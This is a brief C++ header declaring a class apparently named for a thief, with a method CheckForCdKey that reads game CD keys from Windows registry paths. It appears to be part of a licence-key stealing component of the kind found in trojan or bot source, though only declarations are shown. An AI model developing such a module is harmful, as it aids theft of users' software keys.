#ifndef THIF_H
#define THIF_H

#include "Includes.h"

class Thif
{
public:
	char *CheckForCdKey(HKEY hk, char *path, char *name, char *GameName);

private:
	HKEY hkey;
	DWORD dwSize;
	unsigned char szDataBuf[128];
};

#endif // THIF_H